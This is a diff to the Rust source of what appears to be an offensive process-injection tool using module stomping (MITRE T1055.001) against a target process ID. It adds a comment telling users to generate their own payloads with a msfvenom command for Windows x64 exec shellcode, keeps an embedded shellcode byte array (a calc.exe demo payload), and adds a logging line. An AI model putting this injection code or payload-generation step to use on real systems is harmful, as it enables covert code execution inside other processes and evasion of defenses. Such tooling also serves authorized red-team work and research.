@@ -31,7 +31,8 @@ use std::{env::args, process::Command};
 #[cfg(feature = "tracing")]
 use tracing::{error, info, warn};
 
-// Payload: "Calc.exe"
+// Don't trust me, generate your own payloads!
+// msfvenom -p windows/x64/exec CMD=calc.exe -f rust
 const SHELLCODE: &[u8] = &[
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
     0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
@@ -67,6 +68,7 @@ fn run() -> Result<()> {
     info!("Target Process ID : {}", process_id);
     info!("Technique         : T1055.001 (Module Stomping)");
     info!("Stomp Target      : {}", target_dll_name);
+    info!("Payload           : Shellcode");
     info!("------------------------------------------------");
 
     inject_stomping(process_id, target_dll_name)?;
